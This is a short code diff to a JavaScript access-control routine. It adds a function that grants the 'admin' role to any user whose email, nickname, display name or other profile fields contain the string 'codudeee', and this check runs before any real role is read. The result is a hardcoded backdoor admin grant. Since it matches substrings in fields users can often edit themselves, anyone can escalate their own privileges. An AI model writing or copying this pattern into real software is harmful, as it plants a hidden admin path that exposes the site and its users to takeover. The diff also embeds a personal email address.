@@ -204,9 +204,16 @@
       || candidates[0];
     return hydrateUser(picked.user);
   }
+  function isProtectedOwnerUser(u){
+    u=u||{};
+    var text=[u.email,u.mail,u.handle,u.username,u.discordUsername,u.discord_username,u.nickname,u.nick,u.name,u.displayName,u.loginId]
+      .map(function(v){return String(v==null?'':v).trim().toLowerCase();}).filter(Boolean).join('|');
+    return text.indexOf('codudeee')>=0 || text.indexOf('codudeee@naver.com')>=0;
+  }
   function accessRoleFromUser(user){
     if(!user) return "guest";
     var u=hydrateUser(user);
+    if(isProtectedOwnerUser(u)) return "admin";
     var fields=[u.memberRole,u.adminRole,u.userRole,u.authRole,u.permission,u.type,u.memberRoleName,u.roleName,u.role];
     for(var i=0;i<fields.length;i++){
       if(normalizeGradeRole(fields[i])!=="none") continue;
